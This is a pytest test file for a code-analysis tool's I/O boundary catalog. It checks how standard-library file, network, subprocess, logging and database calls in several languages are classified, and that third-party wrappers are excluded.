# SPDX-License-Identifier: AGPL-3.0-or-later
"""Tests for I/O boundary analysis (ADR-0016).

Covers the Python I/O primitive catalog loading, edge matching,
and boundary map generation.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from hypergumbo_core.io_boundary import (
    HIGH_RISK_EXEMPTIONS_SUBPROCESS,
    HIGH_RISK_PRIMITIVES,
    IO_BOUNDARIES_SCHEMA_VERSION,
    BoundaryMap,
    BoundaryMapEntry,
    IoBoundaryCatalog,
    IoChain,
    IoPrimitive,
    _build_reverse_graph,
    _extract_callee_name,
    _extract_module_hint,
    _is_traceable_edge,
    _module_matches,
    compute_boundary_map,
    is_high_risk,
    load_catalog,
    match_edge_to_primitive,
    tag_io_boundaries,
)
from hypergumbo_core.ir import Edge


class TestIoPrimitive:
    """Tests for the IoPrimitive dataclass."""

    def test_basic_creation(self) -> None:
        p = IoPrimitive(
            boundary="fs_read",
            module="os",
            name="listdir",
            kind="function",
        )
        assert p.boundary == "fs_read"
        assert p.qualified_name == "os.listdir"

    def test_method_qualified_name(self) -> None:
        p = IoPrimitive(
            boundary="fs_read",
            module="pathlib.Path",
            name="read_text",
            kind="method",
        )
        assert p.qualified_name == "pathlib.Path.read_text"


class TestLoadCatalog:
    """Tests for loading YAML I/O primitive catalogs."""

    def test_load_python_catalog(self) -> None:
        catalog = load_catalog("python")
        assert catalog.language == "python"
        assert len(catalog.primitives) > 0

    def test_python_catalog_has_fs_read(self) -> None:
        catalog = load_catalog("python")
        fs_reads = [p for p in catalog.primitives if p.boundary == "fs_read"]
        assert len(fs_reads) > 0
        names = {p.qualified_name for p in fs_reads}
        assert "os.listdir" in names
        assert "pathlib.Path.read_text" in names

    def test_python_catalog_has_fs_write(self) -> None:
        catalog = load_catalog("python")
        fs_writes = [p for p in catalog.primitives if p.boundary == "fs_write"]
        names = {p.qualified_name for p in fs_writes}
        assert "pathlib.Path.write_text" in names
        assert "shutil.rmtree" in names

    def test_python_catalog_has_net_send(self) -> None:
        catalog = load_catalog("python")
        net_sends = [p for p in catalog.primitives if p.boundary == "net_send"]
        names = {p.qualified_name for p in net_sends}
        assert "socket.socket.send" in names

    def test_python_synthetic_file_module_classifies_read_write(self) -> None:
        # WI-fuvuj: ``open(...)`` returns a file object whose .read()/.write()
        # methods carry the synthetic module ``file`` after receiver-type
        # inference in py.py. The catalog must classify them so the
        # module-filter path in lookup_with_module bypasses ambiguous_names
        # suppression for typed receivers.
        catalog = load_catalog("python")
        read_hit = catalog.lookup_with_module("read", "file")
        assert read_hit is not None
        assert read_hit.boundary == "fs_read"
        write_hit = catalog.lookup_with_module("write", "file")
        assert write_hit is not None
        assert write_hit.boundary == "fs_write"

    def test_python_untyped_file_methods_stay_suppressed(self) -> None:
        # WI-fuvuj regression guard: an UNtyped receiver carries the
        # module hint ``external`` (no dst_ref). lookup_with_module falls
        # back to ambiguous_names suppression, so read/write stay None —
        # the synthetic ``file`` module must NOT leak into the external path.
        catalog = load_catalog("python")
        assert catalog.lookup_with_module("read", "external") is None
        assert catalog.lookup_with_module("write", "external") is None

    def test_python_socket_socket_send_recv_pin(self) -> None:
        # WI-fuvuj pin: socket.socket entries already existed; the receiver-
        # type inference produces the ``socket.socket`` module hint for
        # ``s.send()``/``s.recv()``. Pin the boundary classification.
        catalog = load_catalog("python")
        send_hit = catalog.lookup_with_module("send", "socket.socket")
        assert send_hit is not None
        assert send_hit.boundary == "net_send"
        recv_hit = catalog.lookup_with_module("recv", "socket.socket")
        assert recv_hit is not None
        assert recv_hit.boundary == "net_recv"

    def test_python_catalog_stdio_is_logging_not_ipc_send(self) -> None:
        # WI-tolif: 2026-04-23 self-audit found that 70 of hypergumbo's 77
        # ipc_send chains were just sys.stderr writes (cli.py progress
        # output, warnings) — the same false-positive class that drove
        # Go's log/slog/fmt to be moved out of ipc_send into logging
        # (see test_go_catalog_slog_logging). Same fix here for Python:
        # stdout/stderr are terminal output, not inter-process communication.
        catalog = load_catalog("python")
        for attr in ("stdout", "stderr"):
            hit = catalog.lookup_with_module(attr, "sys")
            assert hit is not None, f"sys.{attr} should be in the Python IO catalog"
            assert hit.boundary == "logging", (
                f"sys.{attr} should be classified as logging, not {hit.boundary}"
            )
        # sys.stdin stays in ipc_recv — it can carry untrusted piped input
        # from the parent process (a real IPC threat model, not just terminal echo).
        hit = catalog.lookup_with_module("stdin", "sys")
        assert hit is not None
        assert hit.boundary == "ipc_recv"

    def test_python_catalog_excludes_third_party_wrappers(self) -> None:
        # Plan C, PR A: strict-stdlib-only rule. The previous "grandfathered
        # universally-known HTTP clients" carve-out (requests / httpx /
        # aiohttp) is removed — once you allow one third-party wrapper,
        # the slope is open (treq / niquests / urllib3 / pycurl / ...) and
        # the catalog becomes a maintenance treadmill. The structural
        # answer is the external_potential bucket (PR C of the same plan):
        # tier-3 boundary calls surface as their own bucket, sub-grouped
        # by is_stdlib, without the catalog having to enumerate them.
        catalog = load_catalog("python")
        net_sends = {p.qualified_name for p in catalog.primitives
                     if p.boundary == "net_send"}
        # Originally added in WI-jihuj, reverted in PR3 of stop-stripping.
        assert "huggingface_hub.snapshot_download" not in net_sends
        assert "huggingface_hub.hf_hub_download" not in net_sends
        assert "sentence_transformers.SentenceTransformer" not in net_sends
        # Now removed under the strict-stdlib rule (Plan C PR A).
        assert not any(p.module == "requests" for p in catalog.primitives)
        assert not any(p.module == "requests.Session" for p in catalog.primitives)
        assert not any(p.module == "aiohttp.ClientSession" for p in catalog.primitives)
        assert not any(p.module == "httpx.Client" for p in catalog.primitives)
        assert not any(p.module == "httpx.AsyncClient" for p in catalog.primitives)
        # Stdlib HTTP clients stay.
        assert any(p.module == "urllib.request" for p in catalog.primitives)
        assert any(p.module == "http.client.HTTPConnection"
                   for p in catalog.primitives)

    def test_python_catalog_has_db_read_write(self) -> None:
        # WI-harin: the db_read/db_write boundary categories exist in
        # CATALOG_BOUNDARY_TYPES and are populated in 6 other language
        # catalogs (java JDBC, erlang ets/mnesia, swift/objc Core Data,
        # haskell IORef, elixir Ecto) but were absent from Python. Python's
        # stdlib db surface is sqlite3 + dbm + shelve. The reliably-matchable
        # anchors are the free-function opens (sqlite3.connect / dbm.open /
        # shelve.open); the DB-API method surface (execute/fetch*) is
        # catalogued for completeness/taint even though untyped receivers
        # keep it latent (see test_unresolved_bare_db_method_not_tagged).
        catalog = load_catalog("python")
        db = {
            p.qualified_name: p.boundary
            for p in catalog.primitives
            if p.boundary in ("db_read", "db_write")
        }
        assert db, "Python catalog must populate db_read/db_write (WI-harin)"
        # Free-function datastore-open anchors (matchable with a module hint).
        assert db.get("sqlite3.connect") == "db_read"
        assert db.get("dbm.open") == "db_read"
        assert db.get("shelve.open") == "db_read"
        # DB-API method surface (latent until receivers are typed).
        assert db.get("sqlite3.Cursor.execute") == "db_write"
        assert db.get("sqlite3.Cursor.fetchall") == "db_read"
        assert db.get("sqlite3.Connection.commit") == "db_write"

    def test_python_db_primitives_are_stdlib_or_type_verified_carveout(self) -> None:
        # WI-harin + WI-sozoj admission criterion. The db_* catalog is stdlib
        # (sqlite3 / dbm / shelve) PLUS the one documented type-verified
        # framework carve-out ``django.db.models`` (WI-sozoj). WI-harin's
        # exclusion was a PRECISION rule against short-name matching of UNTYPED
        # receivers, not a purity ban: the django entries fire ONLY through
        # py.py's typed ``.objects``/``models.Model``-subclass module hint (the
        # module-filter path), never the bare short-name gate, so `dict.get()`
        # cannot false-tag. Any OTHER third-party db module is STILL forbidden —
        # this guards the boundary against untyped short-name ORM creep. A new
        # framework datastore entry must meet the criterion (a real distinctive
        # module namespace + a type-verified receiver + a bounded method set) and
        # be added to the allow-list below deliberately.
        catalog = load_catalog("python")
        _STDLIB_DB_MODULE_ROOTS = ("sqlite3", "dbm", "shelve")
        _TYPE_VERIFIED_DB_MODULES = ("django.db.models",)
        for p in catalog.primitives:
            if p.boundary not in ("db_read", "db_write"):
                continue
            root = p.module.split(".")[0]
            allowed = (
                root in _STDLIB_DB_MODULE_ROOTS
                or p.module in _TYPE_VERIFIED_DB_MODULES
            )
            assert allowed, (
                f"Python db_* catalog must be stdlib (sqlite3/dbm/shelve) or a "
                f"documented type-verified carve-out {_TYPE_VERIFIED_DB_MODULES}; "
                f"module {p.module!r} ({p.qualified_name}) is neither. A new "
                f"framework datastore entry needs a type-verified receiver + a "
                f"bounded method set + an explicit allow-list addition here."
            )

    def test_python_catalog_drops_execute_from_command_line_fp(self) -> None:
        # WI-harin: django.core.management.execute_from_command_line was
        # classified net_recv — a false positive. It is a CLI dispatcher
        # (manage.py entry that routes to migrate/collectstatic/runserver/…),
        # not itself a network receive; and it is third-party framework code
        # (out of scope under the Plan-C strict-stdlib rule the net_send side
        # already enforces). Removed outright.
        catalog = load_catalog("python")
        assert not any(
            p.name == "execute_from_command_line" for p in catalog.primitives
        ), "execute_from_command_line net_recv FP must be removed (WI-harin)"
        assert not any(
            p.module == "django.core.management" for p in catalog.primitives
        )

    def test_java_catalog_excludes_third_party_wrappers(self) -> None:
        # Plan C, PR A: strict-stdlib rule. Java's stdlib is the JDK
        # (java.*) plus the historically-bundled javax.* and the
        # standardized jakarta.* (Jakarta EE, formerly Java EE).
        # Everything else is third-party and out: OkHttp, Spring,
        # Apache HttpClient/Commons IO, Unirest, Retrofit, Netty,
        # Hibernate, SLF4J / Log4j / Logback. The structural answer to
        # "first-party Java code calls into Spring or Netty" is the
        # external_potential bucket (Plan C, PR C).
        catalog = load_catalog("java")
        for p in catalog.primitives:
            assert (
                p.module.startswith("java.")
                or p.module.startswith("javax.")
                or p.module.startswith("jakarta.")
            ), (
                f"Java catalog should be strict-stdlib only "
                f"(java.* / javax.* / jakarta.*); third-party module "
                f"{p.module!r} found ({p.qualified_name})"
            )
        # Sanity-check JDK stdlib is still present.
        modules = {p.module for p in catalog.primitives}
        assert "java.net.http.HttpClient" in modules
        assert any(m.startswith("java.io") for m in modules)
        assert any(m.startswith("java.nio") for m in modules)

    def test_javascript_catalog_excludes_third_party_wrappers(self) -> None:
        # Plan C, PR A: cull npm packages. JS doesn't have a single
        # "stdlib" — instead, runtime built-ins per platform stay (Node:
        # http / https / fs / net / child_process; Deno: Deno.* APIs;
        # browser globals: XMLHttpRequest / WebSocket / fetch / window /
        # navigator / document / localStorage / sessionStorage / etc.).
        # Out: any npm package (axios, node-fetch, ky, superagent, got,
        # undici, express, fastify, koa, ...).
        catalog = load_catalog("javascript")
        modules = {p.module for p in catalog.primitives}
        # Third-party HTTP clients.
        assert "axios" not in modules
        assert "node-fetch" not in modules
        assert "ky" not in modules
        assert "superagent" not in modules
        assert "got" not in modules
        assert "undici" not in modules
        # Third-party server frameworks.
        assert "express" not in modules
        assert "express.Application" not in modules
        assert "express.Response" not in modules
        assert "fastify.FastifyInstance" not in modules
        assert "koa.Application" not in modules
        # Runtime built-ins stay.
        assert "http" in modules
        assert "https" in modules
        assert "fs" in modules
        assert "fetch" in modules

    def test_rust_catalog_excludes_third_party_crates(self) -> None:
        # Plan C, PR A: cull tokio / hyper / reqwest. tokio is ubiquitous
        # but third-party — strict rule applies; same governance as every
        # other wrapper. Keep std::*.
        catalog = load_catalog("rust")
        modules = {p.module for p in catalog.primitives}
        assert "tokio::fs" not in modules
        assert "hyper::Client" not in modules
        assert "hyper::client::Client" not in modules
        assert "reqwest::Client" not in modules
        assert not any(m.startswith("tokio::net") for m in modules)
        # std stays.
        assert any(m.startswith("std::") for m in modules)

    def test_kotlin_catalog_excludes_third_party_wrappers(self) -> None:
        # Plan C, PR A: Kotlin's stdlib namespace is `kotlin.*` (plus
        # inherited `java.*` / `javax.*` / `jakarta.*` from the Java
        # parent catalog). Removed: ktor (`io.ktor.*`), kotlin-logging
        # (`mu.KLogger`, `io.github.oshai.kotlinlogging.*`), Android SDK
        # (`android.*`), Exposed ORM (`org.jetbrains.exposed.*`).
        catalog = load_catalog("kotlin")
        for p in catalog.primitives:
            assert (
                p.module.startswith("kotlin")
                or p.module.startswith("java.")
                or p.module.startswith("javax.")
                or p.module.startswith("jakarta.")
            ), (
                f"Kotlin catalog should be strict-stdlib only "
                f"(kotlin.* / java.* / javax.* / jakarta.*); third-party "
                f"module {p.module!r} found ({p.qualified_name})"
            )

    def test_scala_catalog_excludes_third_party_wrappers(self) -> None:
        # Plan C, PR A: Scala stdlib is `scala.*` (and inherits `java.*` /
        # `javax.*` / `jakarta.*` from the Java catalog). Everything else
        # is third-party and out: akka.*, org.apache.pekko.*, org.http4s.*,
        # play.api.*, sttp.*, fs2.*, cats.*, zio.*.
        catalog = load_catalog("scala")
        for p in catalog.primitives:
            assert (
                p.module.startswith("scala")
                or p.module.startswith("java.")
                or p.module.startswith("javax.")
                or p.module.startswith("jakarta.")
            ), (
                f"Scala catalog should be strict-stdlib only "
                f"(scala.* / java.* / javax.* / jakarta.*); third-party "
                f"module {p.module!r} found ({p.qualified_name})"
            )

    def test_python_catalog_has_subprocess(self) -> None:
        catalog = load_catalog("python")
        subprocs = [p for p in catalog.primitives if p.boundary == "subprocess"]
        names = {p.qualified_name for p in subprocs}
        assert "subprocess.run" in names

    def test_python_catalog_has_env_read(self) -> None:
        catalog = load_catalog("python")
        env_reads = [p for p in catalog.primitives if p.boundary == "env_read"]
        names = {p.qualified_name for p in env_reads}
        assert "os.getenv" in names

    def test_python_catalog_all_boundaries_present(self) -> None:
        catalog = load_catalog("python")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {"fs_read", "fs_write", "net_send", "net_recv", "subprocess", "env_read"}
        assert expected.issubset(boundaries)

    def test_catalog_builds_lookup(self) -> None:
        catalog = load_catalog("python")
        # The lookup should enable O(1) matching by qualified name
        assert catalog.lookup("os.listdir") is not None
        assert catalog.lookup("os.listdir").boundary == "fs_read"
        assert catalog.lookup("nonexistent.function") is None

    def test_load_rust_catalog(self) -> None:
        catalog = load_catalog("rust")
        assert catalog.language == "rust"
        assert len(catalog.primitives) > 0
        names = {p.qualified_name for p in catalog.primitives}
        assert "std::fs.read" in names or "std::fs.read_to_string" in names
        assert catalog.lookup("std::fs.read_to_string") is not None
        assert catalog.lookup("std::fs.read_to_string").boundary == "fs_read"

    def test_load_javascript_catalog(self) -> None:
        catalog = load_catalog("javascript")
        assert catalog.language == "javascript"
        assert len(catalog.primitives) > 0
        names = {p.qualified_name for p in catalog.primitives}
        assert "fs.readFileSync" in names
        assert "child_process.spawn" in names
        assert catalog.lookup("fs.readFileSync").boundary == "fs_read"
        assert catalog.lookup("child_process.spawn").boundary == "subprocess"

    def test_rust_catalog_has_all_boundary_types(self) -> None:
        catalog = load_catalog("rust")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {"fs_read", "fs_write", "net_send", "net_recv", "subprocess", "env_read"}
        assert expected.issubset(boundaries)

    # Plan C, PR A: presence test for Tokio / Hyper / Reqwest / Axum
    # removed — those crates are no longer in the catalog. Inverse
    # coverage: test_rust_catalog_excludes_third_party_crates.

    def test_javascript_catalog_has_all_boundary_types(self) -> None:
        catalog = load_catalog("javascript")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {"fs_read", "fs_write", "net_send", "net_recv", "subprocess", "env_read"}
        assert expected.issubset(boundaries)

    def test_javascript_browser_storage_reads_not_fs_read(self) -> None:
        """WI-kanir-huzuj: localStorage/sessionStorage/indexedDB/caches reads
        live under browser_storage_read, not fs_read. Browser storage is
        reachable via XSS, not host-filesystem access, so conflating it
        with fs_read produced misleading "filesystem read" chains.
        """
        catalog = load_catalog("javascript")
        assert catalog.lookup("localStorage.getItem").boundary == (
            "browser_storage_read"
        )
        assert catalog.lookup("sessionStorage.getItem").boundary == (
            "browser_storage_read"
        )
        assert catalog.lookup("indexedDB.open").boundary == (
            "browser_storage_read"
        )
        assert catalog.lookup("caches.match").boundary == (
            "browser_storage_read"
        )
        by_boundary: dict[str, set[str]] = {}
        for p in catalog.primitives:
            by_boundary.setdefault(p.boundary, set()).add(p.qualified_name)
        assert "localStorage.getItem" not in by_boundary.get("fs_read", set())
        assert "indexedDB.open" not in by_boundary.get("fs_read", set())

    def test_javascript_catalog_stdio_is_logging_not_ipc_send(self) -> None:
        """WI-dutah: process.{stdout,stderr} are terminal output, not IPC.

        Same threat-model logic as the Python sys.{stdout,stderr} migration
        (WI-tolif): terminal writes inflate ipc_send false positives without
        any real IPC threat. ``process.send`` stays in ``ipc_send`` (real
        IPC to a forked child) and ``process.stdin`` stays in ``ipc_recv``
        (can carry untrusted piped input).
        """
        catalog = load_catalog("javascript")
        for attr in ("stdout", "stderr"):
            hit = catalog.lookup_with_module(attr, "process")
            assert hit is not None, (
                f"process.{attr} should be in the JavaScript IO catalog"
            )
            assert hit.boundary == "logging", (
                f"process.{attr} should be classified as logging, "
                f"not {hit.boundary}"
            )
        # process.send is real IPC (child_process.fork message-passing).
        hit = catalog.lookup_with_module("send", "process")
        assert hit is not None
        assert hit.boundary == "ipc_send"
        # process.stdin can carry untrusted piped input — stays ipc_recv.
        hit = catalog.lookup_with_module("stdin", "process")
        assert hit is not None
        assert hit.boundary == "ipc_recv"

    def test_rust_catalog_stdio_is_logging_not_ipc_send(self) -> None:
        """WI-dutah: std::io.{stdout,stderr} are logging, not ipc_send.

        Mirrors the Python sys.{stdout,stderr} migration (WI-tolif).
        std::io.stdin stays in ipc_recv (can carry untrusted piped input).
        """
        catalog = load_catalog("rust")
        for attr in ("stdout", "stderr"):
            hit = catalog.lookup_with_module(attr, "std::io")
            assert hit is not None, (
                f"std::io.{attr} should be in the Rust IO catalog"
            )
            assert hit.boundary == "logging", (
                f"std::io.{attr} should be classified as logging, "
                f"not {hit.boundary}"
            )
        hit = catalog.lookup_with_module("stdin", "std::io")
        assert hit is not None
        assert hit.boundary == "ipc_recv"

    def test_load_go_catalog(self) -> None:
        catalog = load_catalog("go")
        assert catalog.language == "go"
        assert len(catalog.primitives) > 0
        assert catalog.lookup("os.ReadFile").boundary == "fs_read"
        assert catalog.lookup("net/http.Get").boundary == "net_send"
        assert catalog.lookup("os/exec.Command").boundary == "subprocess"

    def test_go_catalog_has_all_boundary_types(self) -> None:
        catalog = load_catalog("go")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {"fs_read", "fs_write", "net_send", "net_recv", "subprocess", "env_read"}
        assert expected.issubset(boundaries)

    def test_go_catalog_testing_tempdir(self) -> None:
        """testing.T.TempDir is fs_write (creates a temp directory).

        When qualified-type tracking identifies t.TempDir() as a testing.T
        method, the IO boundary catalog must classify it as fs_write.
        Previously this was incorrectly matched to io/ioutil.TempDir via
        the 'external' module hint fallback.
        """
        catalog = load_catalog("go")
        hit = catalog.lookup_with_module("TempDir", "testing")
        assert hit is not None, "testing.T.TempDir should be in the Go IO catalog"
        assert hit.boundary == "fs_write"

    def test_go_catalog_slog_logging(self) -> None:
        """log/slog functions are classified as logging, not ipc_send.

        Go's structured logging writes to stderr by default. These are
        logging operations, not inter-process communication.  Classifying
        them as ipc_send produces hundreds of false positives in Go repos
        (134 in alertmanager).
        """
        catalog = load_catalog("go")
        # Package-level slog functions
        hit = catalog.lookup_with_module("Debug", "log/slog")
        assert hit is not None, "slog.Debug should be in the Go IO catalog"
        assert hit.boundary == "logging"

        hit = catalog.lookup_with_module("Info", "log/slog")
        assert hit is not None
        assert hit.boundary == "logging"

        hit = catalog.lookup_with_module("Error", "log/slog")
        assert hit is not None
        assert hit.boundary == "logging"

        # Without module context, Debug/Info/Error are ambiguous
        assert catalog.lookup_with_module("Debug", None) is None
        assert catalog.lookup_with_module("Error", None) is None

    def test_go_catalog_tls_smtp(self) -> None:
        """TLS and SMTP operations are net_send boundaries."""
        catalog = load_catalog("go")
        # TLS
        hit = catalog.lookup_with_module("Dial", "crypto/tls")
        assert hit is not None, "crypto/tls.Dial should be net_send"
        assert hit.boundary == "net_send"

        # SMTP
        hit = catalog.lookup_with_module("SendMail", "net/smtp")
        assert hit is not None, "net/smtp.SendMail should be net_send"
        assert hit.boundary == "net_send"

        # SMTP client methods with module context
        hit = catalog.lookup_with_module("Mail", "net/smtp")
        assert hit is not None
        assert hit.boundary == "net_send"

        # `Data` is ambiguous without a module hint and must not match bare.
        assert catalog.lookup_with_module("Data", None) is None
        # With one it does. This used to assert a `gin` hint matched
        # gin.Context.Data, which was ENCODING A DEFECT (INV-safig): the
        # framework rows declared a package-identifier module while the
        # analyzer emits the import path, so `gin` is a hint no Go program can
        # produce and the row was unreachable in production. Those rows now
        # live in docs/io-primitives-overlays/go-web-frameworks.yaml, keyed on
        # the real import path. The stdlib row that shares the name carries the
        # same assertion without depending on a fabricated hint.
        hit = catalog.lookup_with_module("Data", "net/smtp")
        assert hit is not None
        assert hit.qualified_name == "net/smtp.Client.Data"
        assert hit.boundary == "net_send"

    def test_go_catalog_stdlib_log(self) -> None:
        """log.Printf etc. are classified as logging, not ipc_send."""
        catalog = load_catalog("go")
        hit = catalog.lookup_with_module("Printf", "log")
        assert hit is not None
        assert hit.boundary == "logging"

        hit = catalog.lookup_with_module("Fatal", "log")
        assert hit is not None
        assert hit.boundary == "logging"

    def test_go_catalog_fmt_console_logging(self) -> None:
        """fmt.Println etc. are classified as logging, not ipc_send."""
        catalog = load_catalog("go")
        hit = catalog.lookup_with_module("Println", "fmt")
        assert hit is not None
        assert hit.boundary == "logging"

        hit = catalog.lookup_with_module("Fprintf", "fmt")
        assert hit is not None
        assert hit.boundary == "logging"

    def test_load_c_catalog(self) -> None:
        catalog = load_catalog("c")
        assert catalog.language == "c"
        assert len(catalog.primitives) > 0
        assert catalog.lookup("stdio.fopen").boundary == "fs_read"
        assert catalog.lookup("unistd.fork").boundary == "subprocess"

    def test_c_catalog_stdio_is_logging_not_ipc_send(self) -> None:
        """WI-dutah: C stdio.{stdout,stderr} are logging, not ipc_send.

        Mirrors the Python sys.{stdout,stderr} migration (WI-tolif).
        stdio.stdin stays in ipc_recv (can carry untrusted piped input).
        """
        catalog = load_catalog("c")
        for attr in ("stdout", "stderr"):
            hit = catalog.lookup_with_module(attr, "stdio")
            assert hit is not None, (
                f"stdio.{attr} should be in the C IO catalog"
            )
            assert hit.boundary == "logging", (
                f"stdio.{attr} should be classified as logging, "
                f"not {hit.boundary}"
            )
        hit = catalog.lookup_with_module("stdin", "stdio")
        assert hit is not None
        assert hit.boundary == "ipc_recv"

    def test_c_catalog_tmpfile(self) -> None:
        """C catalog includes tmpfile/mkstemp temp file creation."""
        catalog = load_catalog("c")
        assert catalog.lookup("stdio.tmpfile").boundary == "fs_write"
        assert catalog.lookup("stdlib.mkstemp").boundary == "fs_write"

    def test_c_catalog_file_lifecycle_functions(self) -> None:
        """C catalog includes fclose, fflush, fseek, rewind, ungetc (bakeoff finding)."""
        catalog = load_catalog("c")
        # fclose releases a file handle — classified as fs_write (resource cleanup)
        assert catalog.lookup("stdio.fclose").boundary == "fs_write"
        # fflush forces buffered data to disk
        assert catalog.lookup("stdio.fflush").boundary == "fs_write"
        # fseek/rewind reposition the file cursor — classified as fs_read
        assert catalog.lookup("stdio.fseek").boundary == "fs_read"
        assert catalog.lookup("stdio.rewind").boundary == "fs_read"
        # ungetc pushes back a character into the read buffer
        assert catalog.lookup("stdio.ungetc").boundary == "fs_read"
        # ftell reports file position
        assert catalog.lookup("stdio.ftell").boundary == "fs_read"

    def test_c_catalog_has_all_boundary_types(self) -> None:
        catalog = load_catalog("c")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {"fs_read", "fs_write", "net_send", "net_recv", "subprocess", "env_read"}
        assert expected.issubset(boundaries)

    def test_load_java_catalog(self) -> None:
        catalog = load_catalog("java")
        assert catalog.language == "java"
        assert len(catalog.primitives) > 0
        assert catalog.lookup("java.nio.file.Files.readAllBytes").boundary == "fs_read"
        assert catalog.lookup("java.lang.ProcessBuilder.start").boundary == "subprocess"

    def test_java_catalog_has_all_boundary_types(self) -> None:
        catalog = load_catalog("java")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {"fs_read", "fs_write", "net_send", "net_recv", "subprocess", "env_read"}
        assert expected.issubset(boundaries)

    # Plan C, PR A: presence tests for Netty / Apache HttpClient /
    # WebClient / Unirest / Retrofit / Apache Commons IO removed —
    # those entries are no longer in the catalog. Inverse coverage:
    # test_java_catalog_excludes_third_party_wrappers iterates every
    # primitive and asserts its module starts with java.* / javax.* /
    # jakarta.*, structurally enforcing the strict-stdlib rule.

    def test_java_catalog_covers_jdbc_and_jpa_stdlib(self) -> None:
        """JDBC and JPA / Jakarta EE persistence stay in the catalog —
        they're stdlib (java.sql.* / javax.persistence.* /
        jakarta.persistence.*). Spring Data and Hibernate were removed
        in Plan C, PR A as third-party.
        """
        catalog = load_catalog("java")
        qnames = {p.qualified_name: p for p in catalog.primitives}
        # JDBC read path
        assert qnames["java.sql.Statement.executeQuery"].boundary == "db_read"
        assert qnames["java.sql.PreparedStatement.executeQuery"].boundary == "db_read"
        assert qnames["java.sql.ResultSet.next"].boundary == "db_read"
        # JDBC write path
        assert qnames["java.sql.Statement.executeUpdate"].boundary == "db_write"
        assert qnames["java.sql.PreparedStatement.executeUpdate"].boundary == "db_write"
        # Transaction control
        assert qnames["java.sql.Connection.commit"].boundary == "db_write"
        # JPA (both javax and jakarta namespaces)
        assert qnames["javax.persistence.EntityManager.find"].boundary == "db_read"
        assert qnames["jakarta.persistence.EntityManager.persist"].boundary == "db_write"

    def test_java_catalog_covers_jdk_logging(self) -> None:
        """java.util.logging stays in the catalog — JDK built-in.
        SLF4J, Log4j 1.x / 2.x, Logback were removed in Plan C, PR A
        as third-party façades / implementations.
        """
        catalog = load_catalog("java")
        qnames = {p.qualified_name: p for p in catalog.primitives}
        assert qnames["java.util.logging.Logger.info"].boundary == "logging"

    def test_kotlin_loads_own_catalog_with_java_parent(self) -> None:
        """WI-rujos: Kotlin has its own catalog merged with Java parent.

        Kotlin idiom favors extension functions on java.io.File (readText,
        writeText, forEachLine) and top-level println/print that have no
        Java analog. The Java parent fills in the raw java.io/java.net/JDBC
        entries so code using the underlying Java APIs directly is still
        matched. Plan C, PR A: third-party Kotlin ecosystem (ktor,
        kotlin-logging, Android SDK, Exposed) removed under strict-stdlib
        rule.
        """
        catalog = load_catalog("kotlin")
        assert catalog.language == "kotlin"
        # Java parent is merged in
        assert catalog.lookup("java.io.FileInputStream.read") is not None
        # Kotlin-specific extensions are present
        assert catalog.lookup("java.io.File.readText") is not None
        assert catalog.lookup("java.io.File.writeText") is not None
        # kotlin.io top-level println — what detekt et al. actually use
        assert catalog.lookup("kotlin.io.ConsoleKt.println") is not None

    def test_kotlin_catalog_covers_all_expected_boundaries(self) -> None:
        """Kotlin catalog emits every boundary kind the UAT flagged missing.

        UAT BUG-09d noted that detekt produced exactly one boundary
        (net_send). With the catalog expansion, Kotlin-specific primitives
        cover fs_read, fs_write, net_send, net_recv, logging, db_read,
        and db_write — matching the breadth of the Java parent.
        """
        catalog = load_catalog("kotlin")
        boundaries = {p.boundary for p in catalog.primitives}
        for expected in (
            "fs_read", "fs_write", "net_send", "net_recv",
            "logging", "db_read", "db_write",
        ):
            assert expected in boundaries, (
                f"Kotlin catalog missing boundary kind: {expected}"
            )

    def test_kotlin_is_not_a_plain_alias_anymore(self) -> None:
        """Regression guard: kotlin was previously in _CATALOG_ALIASES, which
        made it load java.yaml verbatim. The move to _CATALOG_PARENTS is what
        enables Kotlin-specific entries. If kotlin ever reappears in the
        alias map by mistake, its own catalog would be ignored and this
        test's assertion on `catalog.language == "kotlin"` would regress.
        """
        from hypergumbo_core.io_boundary import (
            _CATALOG_ALIASES, _CATALOG_PARENTS,
        )
        assert "kotlin" not in _CATALOG_ALIASES
        assert _CATALOG_PARENTS.get("kotlin") == "java"

    def test_scala_loads_own_catalog_with_java_parent(self) -> None:
        """Scala has its own catalog merged with Java parent."""
        catalog = load_catalog("scala")
        assert len(catalog.primitives) > 0
        assert catalog.language == "scala"

    def test_groovy_alias_loads_java_catalog(self) -> None:
        """Groovy uses the Java IO catalog via alias."""
        catalog = load_catalog("groovy")
        assert len(catalog.primitives) > 0

    def test_load_nonexistent_language_returns_empty(self) -> None:
        catalog = load_catalog("brainfuck")
        assert catalog.language == "brainfuck"
        assert len(catalog.primitives) == 0

    def test_unsupported_language_flagged_is_supported_false(self) -> None:
        """INV-javam: a language with no catalog/alias/parent returns
        is_supported=False so callers can distinguish "found zero I/O"
        from "language unsupported".
        """
        catalog = load_catalog("brainfuck")
        assert catalog.is_supported is False

    def test_supported_language_is_supported_true(self) -> None:
        """INV-javam: a language with a catalog returns is_supported=True."""
        assert load_catalog("python").is_supported is True
        assert load_catalog("java").is_supported is True

    def test_alias_language_is_supported(self) -> None:
        """INV-javam: an aliased language (typescript → javascript) is
        considered supported because the alias catalog loads.
        """
        assert load_catalog("typescript").is_supported is True
        assert load_catalog("cpp").is_supported is True

    def test_parent_language_is_supported(self) -> None:
        """INV-javam: a language with a parent catalog (scala → java,
        kotlin → java, elixir → erlang) is considered supported.
        """
        assert load_catalog("scala").is_supported is True
        assert load_catalog("kotlin").is_supported is True
        assert load_catalog("elixir").is_supported is True

    def test_is_language_supported_helper(self) -> None:
        """INV-javam: module-level helper mirrors the catalog flag for
        callers that don't want to materialize the full catalog.
        """
        from hypergumbo_core.io_boundary import is_language_supported
        assert is_language_supported("python") is True
        assert is_language_supported("brainfuck") is False

    def test_cpp_alias_loads_c_catalog(self) -> None:
        """C++ has no dedicated catalog but falls back to C via alias."""
        catalog = load_catalog("cpp")
        assert len(catalog.primitives) > 0
        boundaries = {p.boundary for p in catalog.primitives}
        assert "fs_read" in boundaries
        assert "fs_write" in boundaries

    def test_typescript_alias_loads_javascript_catalog(self) -> None:
        """TypeScript falls back to JavaScript catalog via alias."""
        catalog = load_catalog("typescript")
        assert len(catalog.primitives) > 0
        boundaries = {p.boundary for p in catalog.primitives}
